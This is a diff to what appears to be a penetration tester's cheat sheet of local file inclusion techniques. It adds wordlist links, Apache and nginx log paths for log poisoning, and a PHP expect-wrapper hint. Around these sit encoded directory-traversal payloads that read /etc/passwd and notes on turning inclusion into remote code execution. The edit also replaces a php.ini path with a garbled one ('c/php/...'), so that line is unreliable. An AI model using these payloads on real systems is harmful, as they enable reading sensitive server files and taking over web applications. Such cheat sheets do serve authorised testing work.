@@ -243,7 +243,17 @@ XXE attack
     ]>
 
 FILE INCLUSION
+    
+    #Wordlists
+    https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-Jhaddix.txt
+    https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux
 
+    #When testing for LFI, check for `/etc/apache2/apache2.conf` and take note of the log dir. Then check for `/etc/apache2/envvars` and find out the value of the sever variable (e.g APACHE_LOG_DIR=/var/log/apache2$SUFFIX)
+
+    /var/log/nginx/error.log
+    /var/log/nginx/access.log
+    extension=expect
+    
     #LFI -  Basic Bypasses
     ....//....//....//....//etc/passwd
     %2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2fetc/passwd
@@ -256,7 +266,7 @@ FILE INCLUSION
     %2e%2e%2e%2e%2f%2f%2f%2f%2e%2e%2e%2e%2f%2f%2f%2f%2e%2e%2e%2e%2f%2f%2f%2f%2e%2e%2e%2e%2f%2f%2f%2f%65%74%63%2f%70%61%73%73%77%64
 
 
-    #Check php.ini to see whether `allow_url_include` is enabled or not (/etc/php/7.4/apache2/php.ini).
+    #Check php.ini to see whether `allow_url_include` is enabled or not (c/php/7.4/apache2/php.ini).
     #If it is enaled it might be possible to achieve RCE with the data wrapper
     #See if you can load a url. If so, you might be able to achieve RCE through RFI
     
